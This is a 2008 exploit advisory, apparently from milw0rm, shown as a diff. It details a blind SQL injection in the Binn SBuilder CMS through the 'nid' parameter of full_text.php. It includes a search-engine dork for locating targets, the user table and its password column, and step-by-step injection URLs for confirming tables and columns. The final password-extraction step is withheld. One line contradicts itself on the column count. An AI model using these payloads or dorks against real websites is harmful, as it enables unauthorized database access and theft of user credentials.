@@ -1,0 +1,75 @@
+--==+=================== Spanish Hackers Team (www.spanish-hackers.com) =================+==--
+--==+              Binn SBuilder (nid) Remote Blind Sql Injection Vulnerabily            +==--
+--==+====================================================================================+==--
+                     [+] [JosS] + [Spanish Hackers Team] + [Sys - Project]
+
+[+] Info:
+
+[~] Software: Binn SBuilder
+[~] HomePage: http://www.cms.ge/
+[~] Exploit: Blind Sql Injection [High]
+[~] Where: full_text.php?nid=
+[~] Bug Found By: JosS
+[~] Contact: sys-project[at]hotmail.com
+[~] Web: http://www.spanish-hackers.com
+[~] Dork: "Powered by CMS.GE"
+[~] Dork2: priv8!
+
+[+] Important tables and columns:
+
+[*] Tables:
+
+[~] Table: binn_users
+
+[*] Columns:
+
+[~] Column: bu_id
+[~] Column 2: bu_login
+[~] Column 3: bu_pass
+[~] Column 4: bu_name
+[~] Column 5: bu_admin
+[~] Column 6: bu_last_ip
+[~] Column 7: bu_last_date
+
+[+] Compression:
+
+[~] True: http://localhost/[path]/full_text.php?nid=[NUM] and 1=1
+[~] False: http://localhost/[path]/full_text.php?nid=[NUM] and 1=2
+[~] Example: http://localhost/[path]/full_text.php?nid=4855 and 1=1
+[~] Example2: http://localhost/[path]/full_text.php?nid=4855 and 1=2
+[~] If you see the Web correctly is true, if it is not false.
+
+[+] Exploding:
+
+[*] Checking table: 
+
+[~] Exploit: http://localhost/[path]/full_text.php?nid=[NUM] AND (SELECT Count(*) FROM [TABLE]) >= 0
+[~] Exploit2: http://localhost/[path]/full_text.php?nid=[NUM] and exists (select * from [TABLE])
+[~] Example: http://localhost/[path]/full_text.php?nid=4855 AND (SELECT Count(*) FROM binn_users) >= 0
+[~] Example2: http://localhost/[path]/full_text.php?nid=4855 and exists (select * from binn_users)
+[~] If you don't see any error, it is that table exist.
+
+[*] Checking columns number of table:
+
+[~] Exploit: http://localhost/[path]/full_text.php?nid=[NUM] AND (SELECT Count(*) FROM [TABLE]) = [NUMBER]
+[~] Example: http://localhost/[path]/full_text.php?nid=4855 AND (SELECT Count(*) FROM binn_users) = 7
+[~] If you don't see any error, the table has 6 columns.
+
+[*] Checking columns of table:
+
+[~] Exploit: http://localhost/[path]/full_text.php?nid=[NUM] AND (SELECT Count([COLUMN]) FROM [TABLE]) >= 0
+[~] Example: http://localhost/[path]/full_text.php?nid=4855 AND (SELECT Count(bu_pass) FROM binn_users) >= 0
+[~] If you don't see any error, the column exists.
+
+[*] Admin Password; Noob or Lammer?:
+
+[~] Exploit: Priv8
+[~] Example: Priv8
+[~] Priv8 , xD.
+
+--==+=================== Spanish Hackers Team (www.spanish-hackers.com) =================+==--
+--==+                                       JosS                                         +==--
+--==+====================================================================================+==--
+                                       [+] [The End]
+
+# milw0rm.com [2008-01-13]
